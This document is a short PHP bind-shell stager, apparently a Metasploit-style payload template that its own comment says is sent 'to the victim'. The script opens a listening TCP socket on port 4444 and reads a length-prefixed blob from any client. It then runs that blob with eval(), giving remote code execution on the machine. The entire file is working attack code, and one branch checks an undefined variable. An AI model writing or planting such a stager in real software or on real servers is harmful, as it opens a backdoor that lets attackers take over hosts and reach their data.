#<?php

# The payload handler overwrites this with the correct LPORT before sending
# it to the victim.
$port = 4444;
$ipaddr = "0.0.0.0";

if (is_callable('stream_socket_server')) {
	$srvsock = stream_socket_server("tcp://{$ipaddr}:{$port}");
	if (!$srvsock) { die(); }
	$msgsock = stream_socket_accept($srvsock, -1);
	$msgsock_type = 'stream';
} elseif (is_callable('socket_create_listen')) {
	$srvsock = socket_create_listen(AF_INET, SOCK_STREAM, SOL_TCP);
	if (!$res) { die(); }
	$msgsock = socket_accept($srvsock);
	$msgsock_type = 'socket';
} elseif (is_callable('socket_create')) {
	$srvsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
	$res = socket_bind($srvsock, $ipaddr, $port);
	if (!$res) { die(); }
	$msgsock = socket_accept($srvsock);
	$msgsock_type = 'socket';
} else {
	die();
}
if (!$msgsock) { die(); }

switch ($msgsock_type) { 
case 'stream': $len = fread($msgsock, 4); break;
case 'socket': $len = socket_read($msgsock, 4); break;
}
if (!$len) {
	# We failed on the main socket.  There's no way to continue, so
	# bail
	die();
}
$a = unpack("Nlen", $len);
$len = $a['len'];

$buffer = '';
while (strlen($buffer) < $len) {
	switch ($msgsock_type) { 
	case 'stream': $buffer .= fread($msgsock, $len-strlen($buffer)); break;
	case 'socket': $buffer .= socket_read($msgsock, $len-strlen($buffer)); break;
	}
}

eval($buffer);
die();
